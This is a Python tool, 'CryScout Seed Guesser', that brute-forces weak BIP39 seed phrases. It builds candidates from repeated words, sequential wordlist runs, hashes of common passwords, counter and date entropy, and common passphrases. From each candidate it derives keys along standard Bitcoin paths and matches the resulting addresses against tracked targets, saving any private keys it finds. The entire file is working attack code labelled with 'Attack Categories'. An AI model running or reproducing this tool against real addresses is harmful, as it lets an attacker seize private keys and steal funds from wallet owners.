#!/usr/bin/env python3
"""
CryScout Seed Guesser — BIP39 Mnemonic Pattern Scanner

Systematically generates and tests weak/predictable BIP39 seed phrases against
tracked Bitcoin addresses. Derives multiple address types and derivation paths.

Attack Categories:
1. Repeated-word mnemonics (e.g. "abandon abandon abandon...")
2. Sequential-word mnemonics (first N words from wordlist)
3. Famous phrases / pop culture mapped to closest BIP39 words
4. Low-entropy seeds (all words from a small subset)
5. Common password patterns converted to mnemonics
6. Numeric sequences as mnemonic indices
7. Known compromised seeds from history
8. Passphrase variants on common seeds
"""

import hashlib
import hmac
import struct
import itertools
import time
import ecdsa
import base58
from mnemonic import Mnemonic
from db_manager import get_connection, add_recovered_key, add_finding
from lattice_nonce_analyzer import pubkey_to_address, pubkey_to_segwit_address

# BIP39 English wordlist
M = Mnemonic("english")
WORDLIST = M.wordlist  # 2048 words

P_CURVE = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


# ============================================================
# BIP32 Key Derivation (Hardened + Normal)
# ============================================================

def bip32_master_key(seed_bytes):
    """Derive BIP32 master key from seed."""
    I = hmac.new(b"Bitcoin seed", seed_bytes, hashlib.sha512).digest()
    return I[:32], I[32:]  # key, chain_code


def bip32_derive_child(parent_key, parent_chain, index, hardened=False):
    """Derive a BIP32 child key."""
    if hardened:
        index += 0x80000000
        data = b'\x00' + parent_key + struct.pack('>I', index)
    else:
        sk = ecdsa.SigningKey.from_string(parent_key, curve=ecdsa.SECP256k1)
        pub = sk.get_verifying_key().to_string("compressed")
        data = pub + struct.pack('>I', index)

    I = hmac.new(parent_chain, data, hashlib.sha512).digest()
    child_key_int = (int.from_bytes(I[:32], 'big') + int.from_bytes(parent_key, 'big')) % P_CURVE
    child_key = child_key_int.to_bytes(32, 'big')
    return child_key, I[32:]


def derive_path(seed_bytes, path_components):
    """Derive key at a BIP32 path like [44', 0', 0', 0, 0]."""
    key, chain = bip32_master_key(seed_bytes)
    for component in path_components:
        hardened = isinstance(component, str) and component.endswith("'")
        idx = int(component.rstrip("'")) if isinstance(component, str) else component
        key, chain = bip32_derive_child(key, chain, idx, hardened=hardened)
    return key


def privkey_to_all_addresses(privkey_bytes):
    """Convert a private key to all standard address formats."""
    try:
        sk = ecdsa.SigningKey.from_string(privkey_bytes, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()

        addrs = []
        # Legacy compressed
        addrs.append(pubkey_to_address(vk.to_string('compressed')))
        # Legacy uncompressed
        addrs.append(pubkey_to_address(vk.to_string('uncompressed')))
        # SegWit (bc1q...)
        addrs.append(pubkey_to_segwit_address(vk.to_string('compressed')))
        return addrs
    except Exception:
        return []


# ============================================================
# Address Derivation from Mnemonic
# ============================================================

# Standard BIP derivation paths
DERIVATION_PATHS = [
    # BIP44 (Legacy P2PKH) — m/44'/0'/0'/0/i
    [("44", True), ("0", True), ("0", True), (0, False), (0, False)],
    [("44", True), ("0", True), ("0", True), (0, False), (1, False)],
    # BIP49 (P2SH-SegWit) — m/49'/0'/0'/0/i 
    [("49", True), ("0", True), ("0", True), (0, False), (0, False)],
    # BIP84 (Native SegWit) — m/84'/0'/0'/0/i
    [("84", True), ("0", True), ("0", True), (0, False), (0, False)],
    [("84", True), ("0", True), ("0", True), (0, False), (1, False)],
    # BIP32 direct — m/0/0, m/0'/0
    [(0, False), (0, False)],
    [("0", True), (0, False)],
    # Electrum-style — m/0/i
    [(0, False), (0, False)],
    [(0, False), (1, False)],
    # Master key (no derivation)
    [],
]


def addresses_from_mnemonic(phrase, passphrase=""):
    """Derive all standard addresses from a BIP39 mnemonic."""
    try:
        seed = M.to_seed(phrase, passphrase=passphrase)
    except Exception:
        return []

    all_addrs = {}  # address -> (privkey_hex, path_desc)

    for path_spec in DERIVATION_PATHS:
        try:
            if not path_spec:
                # Master key
                key, _ = bip32_master_key(seed)
            else:
                key, chain = bip32_master_key(seed)
                for component, hardened in path_spec:
                    idx = int(component) if isinstance(component, str) else component
                    key, chain = bip32_derive_child(key, chain, idx, hardened=hardened)

            pk_hex = key.hex()
            for addr in privkey_to_all_addresses(key):
                path_str = "m/" + "/".join(
                    f"{c}'" if h else str(c) for c, h in path_spec
                ) if path_spec else "m (master)"
                all_addrs[addr] = (pk_hex, path_str)
        except Exception:
            continue

    return all_addrs


# ============================================================
# Seed Generation Strategies
# ============================================================

def gen_repeated_word_seeds():
    """Generate 12/24-word mnemonics where all words are the same."""
    print("  [Strategy 1] Repeated-word mnemonics...")
    seeds = []
    for word in WORDLIST:
        for length in [12, 15, 18, 24]:
            phrase = " ".join([word] * length)
            # Only add if valid checksum (most won't be, but some will)
            if M.check(phrase):
                seeds.append(phrase)
            # Also try generating valid seed by placing the word and fixing checksum
    
    # Force-generate valid seeds with repeated words
    # The last word contains the checksum, so we can fix it
    for word in WORDLIST:
        idx = WORDLIST.index(word)
        for length in [12]:
            # 12 words = 128 bits entropy + 4 bits checksum
            # Generate entropy where all 11-bit chunks are the same word index
            entropy_bits = format(idx, '011b') * 11  # 121 bits, need 128
            entropy_bits += '0' * (128 - len(entropy_bits))
            entropy_bytes = int(entropy_bits, 2).to_bytes(16, 'big')
            try:
                phrase = M.to_mnemonic(entropy_bytes)
                seeds.append(phrase)
            except Exception:
                pass
    
    print(f"    Generated {len(seeds)} repeated-word seeds")
    return seeds


def gen_sequential_seeds():
    """Generate mnemonics from sequential wordlist positions."""
    print("  [Strategy 2] Sequential-word mnemonics...")
    seeds = []
    
    # First N words: "abandon ability able about above..."
    for start in range(0, 200, 11):
        for length in [12]:
            words = WORDLIST[start:start + 11]
            if len(words) < 11:
                continue
            entropy_bits = ''.join(format(WORDLIST.index(w), '011b') for w in words)
            entropy_bits += '0' * (128 - len(entropy_bits))
            if len(entropy_bits) >= 128:
                entropy_bytes = int(entropy_bits[:128], 2).to_bytes(16, 'big')
                try:
                    phrase = M.to_mnemonic(entropy_bytes)
                    seeds.append(phrase)
                except Exception:
                    pass
    
    # Reverse wordlist
    for start in range(len(WORDLIST) - 12, max(0, len(WORDLIST) - 200), -11):
        words = WORDLIST[start:start + 11]
        entropy_bits = ''.join(format(WORDLIST.index(w), '011b') for w in words)
        entropy_bits += '0' * (128 - len(entropy_bits))
        if len(entropy_bits) >= 128:
            entropy_bytes = int(entropy_bits[:128], 2).to_bytes(16, 'big')
            try:
                phrase = M.to_mnemonic(entropy_bytes)
                seeds.append(phrase)
            except Exception:
                pass
    
    print(f"    Generated {len(seeds)} sequential seeds")
    return seeds


def gen_known_compromised_seeds():
    """Seeds that are known to have been compromised or are common test vectors."""
    print("  [Strategy 3] Known compromised seeds...")
    seeds = [
        # All-abandon (most famous weak seed)
        "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
        # All-zoo
        "zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong",
        # Test vectors from BIP39 spec
        "letter advice cage absurd amount doctor acoustic avoid letter advice cage above",
        "void come effort suffer camp survey warrior heavy shoot primary clutch crush",
        "ozone drill grab fiber curtain grace pudding thank cruise elder eight picnic",
        # Common test seeds
        "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon agent",
        # Bitcoin wiki examples
        "army divorce rather course custom aware cruel rather donkey current slide filter",
    ]
    
    # Generate from common passphrases by converting to entropy
    common_phrases = [
        "password", "bitcoin", "satoshi", "test", "hello", "secret",
        "123456", "god", "love", "money", "master", "admin",
        "correct horse battery staple", "letmein", "trustno1",
    ]
    
    for phrase in common_phrases:
        # Use SHA256 of phrase as entropy
        entropy = hashlib.sha256(phrase.encode()).digest()[:16]  # 128 bits
        try:
            mnemonic = M.to_mnemonic(entropy)
            seeds.append(mnemonic)
        except Exception:
            pass
        
        # Also try MD5 as entropy
        entropy_md5 = hashlib.md5(phrase.encode()).digest()  # 128 bits
        try:
            mnemonic = M.to_mnemonic(entropy_md5)
            seeds.append(mnemonic)
        except Exception:
            pass
    
    print(f"    Generated {len(seeds)} known-compromised seeds")
    return seeds


def gen_numeric_pattern_seeds():
    """Seeds where entropy is derived from numeric patterns."""
    print("  [Strategy 4] Numeric pattern seeds...")
    seeds = []
    
    # Entropy = 0x00...00, 0x00...01, ..., 0x00..FF
    for i in range(256):
        entropy = bytes([0] * 15 + [i])
        try:
            seeds.append(M.to_mnemonic(entropy))
        except Exception:
            pass
    
    # Entropy = repeated byte
    for b in range(256):
        entropy = bytes([b] * 16)
        try:
            seeds.append(M.to_mnemonic(entropy))
        except Exception:
            pass
    
    # Entropy = counter (0x0001, 0x0002, ...)
    for i in range(1, 10000):
        entropy = i.to_bytes(16, 'big')
        try:
            seeds.append(M.to_mnemonic(entropy))
        except Exception:
            pass
    
    # Entropy = date-based (YYYYMMDD as bytes)
    for year in range(2009, 2027):
        for month in range(1, 13):
            date_int = year * 10000 + month * 100 + 1
            entropy = date_int.to_bytes(16, 'big')
            try:
                seeds.append(M.to_mnemonic(entropy))
            except Exception:
                pass
    
    print(f"    Generated {len(seeds)} numeric pattern seeds")
    return seeds


def gen_passphrase_variant_seeds():
    """Try common seeds with various passphrases."""
    print("  [Strategy 5] Passphrase variants on known seeds...")
    # These are (seed, passphrase) tuples
    base_seeds = [
        "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
        "zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong",
    ]
    
    passphrases = [
        "", " ", "password", "Password", "123456", "bitcoin", "Bitcoin",
        "satoshi", "test", "1234", "pass", "secret", "admin",
        "btc", "wallet", "mypassword", "money", "crypto",
    ]
    
    variants = []
    for seed in base_seeds:
        for pw in passphrases:
            variants.append((seed, pw))
    
    print(f"    Generated {len(variants)} passphrase variants")
    return variants


def gen_low_entropy_combos():
    """Generate seeds from small subsets of the wordlist (2-5 unique words)."""
    print("  [Strategy 6] Low-entropy word combinations...")
    seeds = []
    
    # Most common English words that appear in BIP39
    common_words = [w for w in ['abandon', 'able', 'about', 'above', 'action',
                                 'air', 'all', 'also', 'always', 'any',
                                 'baby', 'before', 'begin', 'best', 'book',
                                 'can', 'change', 'come', 'day', 'end',
                                 'first', 'good', 'great', 'have', 'help',
                                 'just', 'know', 'life', 'like', 'love',
                                 'man', 'money', 'name', 'new', 'one',
                                 'other', 'people', 'right', 'say', 'time',
                                 'very', 'want', 'way', 'will', 'world',
                                 'year', 'zero'] if w in WORDLIST]
    
    # Try 2-word patterns filling 12 positions
    count = 0
    for w1 in common_words[:20]:
        for w2 in common_words[:20]:
            if w1 == w2:
                continue
            # Alternating pattern
            idx1 = WORDLIST.index(w1)
            idx2 = WORDLIST.index(w2)
            bits = (format(idx1, '011b') + format(idx2, '011b')) * 6
            entropy_bytes = int(bits[:128], 2).to_bytes(16, 'big')
            try:
                phrase = M.to_mnemonic(entropy_bytes)
                seeds.append(phrase)
                count += 1
            except Exception:
                pass
            if count >= 500:
                break
        if count >= 500:
            break
    
    print(f"    Generated {len(seeds)} low-entropy combination seeds")
    return seeds


# ============================================================
# Main Scanner
# ============================================================

def run_seed_guesser(target_addresses=None):
    """Run the full seed guesser against all tracked addresses."""
    
    # Load target addresses
    if target_addresses is None:
        conn = get_connection()
        c = conn.cursor()
        c.execute("SELECT address FROM addresses")
        target_addresses = set(row[0] for row in c.fetchall())
        conn.close()
    else:
        target_addresses = set(target_addresses)
    
    print(f"\n{'='*70}")
    print(f"CRYSCOUT SEED GUESSER")
    print(f"{'='*70}")
    print(f"Target addresses: {len(target_addresses)}")
    
    # Generate all candidate seeds
    all_seeds = []
    all_seeds.extend([(s, "") for s in gen_repeated_word_seeds()])
    all_seeds.extend([(s, "") for s in gen_sequential_seeds()])
    all_seeds.extend([(s, "") for s in gen_known_compromised_seeds()])
    all_seeds.extend([(s, "") for s in gen_numeric_pattern_seeds()])
    all_seeds.extend(gen_passphrase_variant_seeds())
    all_seeds.extend([(s, "") for s in gen_low_entropy_combos()])
    
    # Deduplicate
    all_seeds = list(set(all_seeds))
    print(f"\nTotal candidate seeds to test: {len(all_seeds)}")
    print(f"{'='*70}")
    
    found = []
    checked = 0
    start_time = time.time()
    
    for phrase, passphrase in all_seeds:
        try:
            addr_map = addresses_from_mnemonic(phrase, passphrase=passphrase)
            
            for addr, (pk_hex, path) in addr_map.items():
                if addr in target_addresses:
                    pw_str = f" (passphrase: '{passphrase}')" if passphrase else ""
                    print(f"\n  !!! SEED FOUND !!!")
                    print(f"      Address:  {addr}")
                    print(f"      Mnemonic: {phrase}")
                    print(f"      Path:     {path}{pw_str}")
                    print(f"      Key:      {pk_hex[:20]}...")
                    
                    found.append({
                        'address': addr,
                        'mnemonic': phrase,
                        'passphrase': passphrase,
                        'path': path,
                        'privkey': pk_hex,
                    })
                    
                    add_recovered_key(addr, pk_hex, method=f'Seed Guesser ({path})')
                    add_finding(addr, 'Weak Seed', 
                              details=f'Mnemonic: {phrase[:50]}... Path: {path}',
                              severity='Critical')
        except Exception:
            pass
        
        checked += 1
        if checked % 1000 == 0:
            elapsed = time.time() - start_time
            rate = checked / elapsed if elapsed > 0 else 0
            print(f"  Progress: {checked}/{len(all_seeds)} seeds | "
                  f"{rate:.0f}/sec | {len(found)} found | "
                  f"{elapsed:.0f}s elapsed")
    
    elapsed = time.time() - start_time
    print(f"\n{'='*70}")
    print(f"SEED GUESSER COMPLETE")
    print(f"{'='*70}")
    print(f"  Seeds tested:  {checked}")
    print(f"  Keys found:    {len(found)}")
    print(f"  Time elapsed:  {elapsed:.1f}s")
    print(f"  Rate:          {checked/elapsed:.0f} seeds/sec" if elapsed > 0 else "")
    
    if found:
        print(f"\n  RECOVERED SEEDS:")
        for f in found:
            print(f"    {f['address']} <- \"{f['mnemonic'][:60]}...\"")
    
    return found


if __name__ == "__main__":
    import sys
    run_seed_guesser()
